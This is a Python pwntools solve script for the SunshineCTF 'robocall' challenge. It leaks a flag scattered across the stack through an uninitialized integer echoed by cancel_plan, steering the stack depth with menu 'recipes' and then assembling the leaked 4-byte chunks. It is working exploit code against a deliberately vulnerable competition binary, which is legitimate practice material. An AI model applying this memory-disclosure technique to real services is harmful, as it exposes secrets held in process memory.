#!/usr/bin/env python3
# robocall (SunshineCTF) - uninitialized-stack leak in cancel_plan's "You've entered X" echo.
#
# place_flag() scatters the flag across the stack in 4-byte chunks (chunk i = flag[4i:4i+4])
# at fixed depths given by CHUNK_DEPTH. cancel_plan() reads two menu values; if BOTH fail to
# parse as integers, it prints an UNINITIALISED int -> raw_print_int([rbp-0x204]) = stale stack
# = one flag chunk. The chunk you read depends on the call-stack depth at that moment, which you
# control by "bouncing" through menus before descending to cancel:
#   's' = scream       (start_position opt 3)         depth += 0x120
#   'r' = report_outage(call->2, one line)            depth += 0x400
#   'c' = cancel "press 1"                            deeper bounce
# Each recipe below deterministically leaks a specific chunk index.
#
# Usage:  python3 solve.py                 # local ./robocall
#         python3 solve.py sunshinectf.games 26199
import sys
from pwn import *
context.log_level = 'error'

REMOTE = len(sys.argv) >= 3
def spawn():
    if REMOTE: return remote(sys.argv[1], int(sys.argv[2]))
    return process('./robocall')

def start(io): io.sendlineafter(b'frustrated are you?', b'42')      # disable "be_annoying" sleeps
def sp(io,c):  io.recvuntil(b'the FTC.'); io.sendline(str(c).encode())
def scream(io):  sp(io,3); io.recvuntil(b'scale of 1 to 10'); io.sendline(b'5')
def report(io):  sp(io,1); io.recvuntil(b'these options again'); io.sendline(b'2'); \
                 io.recvuntil(b'outage address'); io.sendline(b'addr')
def cancelb(io): sp(io,1); io.recvuntil(b'these options again'); io.sendline(b'6'); \
                 io.recvuntil(b'operator press 3'); io.sendline(b'2'); \
                 [io.sendline(b'z') for _ in range(3)]; \
                 io.recvuntil(b'are you sure you want to stop'); io.sendline(b'1')
BF={'s':scream,'r':report,'c':cancelb}

def descend_leak(io):
    sp(io,1); io.recvuntil(b'these options again'); io.sendline(b'6')
    io.recvuntil(b'operator press 3'); io.sendline(b'2')
    for _ in range(3): io.sendline(b'z')          # login_roleplay: phone/address/pet
    io.recvuntil(b'are you sure you want to stop'); io.sendline(b'x')  # non-numeric -> stays uninit
    io.recvuntil(b'Are you not sure'); io.sendline(b'x')               # non-numeric -> leak
    io.recvuntil(b"You've entered \"")
    return int(io.recvuntil(b'"', drop=True))

def leak(recipe):
    io = spawn(); start(io)
    for ch in recipe: BF[ch](io)
    v = descend_leak(io); io.close()
    return (v & 0xffffffff).to_bytes(4, 'little')

# recipe -> chunk index (verified locally by matching stack addresses / marker content)
RECIPE = {0:'r', 1:'ssss', 2:'sr', 4:'sssss', 5:'ssr',
          7:'ssssss', 8:'sssr', 10:'sssssss', 11:'rr', 12:'c'}

chunks = {}
for idx, rec in sorted(RECIPE.items()):
    try:
        b = leak(rec)
    except Exception as e:
        b = b'????'
    chunks[idx] = b
    print(f"chunk {idx:2d}  recipe={rec:8s} -> {b!r}", flush=True)

# assemble
out = bytearray()
for i in range(0, 13):
    out += chunks.get(i, b'????')      # 3,6,9 unreached -> placeholder
flag = bytes(out).split(b'\x00')[0]
print("\nassembled:", flag.decode('latin1'))
